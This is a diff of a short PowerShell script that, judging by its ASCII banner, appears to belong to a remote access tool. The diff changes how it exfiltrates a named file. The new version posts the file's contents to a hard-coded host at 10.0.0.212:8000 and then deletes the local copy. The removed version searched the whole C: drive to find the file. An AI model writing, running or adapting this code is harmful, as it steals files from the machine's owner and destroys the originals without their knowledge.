@@ -1,6 +1,6 @@
 $file_name = If ($args[0]) { $args[0] }else { Write-Error "Please specify the file name..." }
 
-function title() {
+function title {
    Write-Host "
     _ __ ___   ___   __| |_   _| | __ _ _ __   _ __ __ _| |_
    | '_ ` _ \ / _ \ / _` | | | | |/ _` | '__| | '__/ _` | __|
@@ -15,28 +15,27 @@ function title() {
 }
 
 
-
 function upload($file_location) {
-   $remote_host = "10.0.0.212"
-   $Dest = "\\$remote_host\$file_location"
-   
-   $WebClient.UploadFile($Dest, $file_location)
+   $uri = "http://10.0.0.212:8000/upload"
+   $contentType = "multipart/form-data"
+   $headers=New-Object "System.Collections.Generic.Dictionary[[String], [String]]"
+   $headers.Add("Content-Type", $contentType)
+   $body = @{
+      "files" = Get-Content("$file_location") -Raw
+   }
+   Invoke-WebRequest -Uri $uri -Method Post -Headers $headers -ContentType $contentType -Body $body
 }
 
 function run() {
-   $location = ""
+   title
    try {
       $location = Get-Item "$file_name" -ErrorAction Stop
-   }
-   catch {
-      # find file if not saved in current directory
-      Write-Host "Error while trying to find file in current directory, will try to find it elsewhere..." -ForegroundColor Red
-      $location = Get-Childitem -Path C:\ -Include $file_name -Exclude *.ps1 -File -Recurse -ErrorAction SilentlyContinue
-   }
-   finally {
-      #upload
       upload($location)
       Remove-Item "$location"
+   }
+   catch {
+      Write-Host "Error while trying to upload file" -ForegroundColor Red
+      exit 
    }
 }
 
